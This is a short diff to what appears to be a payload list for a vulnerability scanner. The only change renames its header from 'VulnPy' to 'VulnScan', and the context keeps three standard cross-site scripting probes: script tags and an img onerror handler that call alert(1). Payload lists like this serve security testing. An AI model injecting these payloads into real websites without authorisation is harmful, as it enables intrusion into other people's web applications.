@@ -1,5 +1,5 @@
 
-# XSS payloads for VulnPy
+# XSS payloads for VulnScan
 <script>alert(1)</script>
 <img src=x onerror=alert(1)>
 "<script>alert(1)</script>
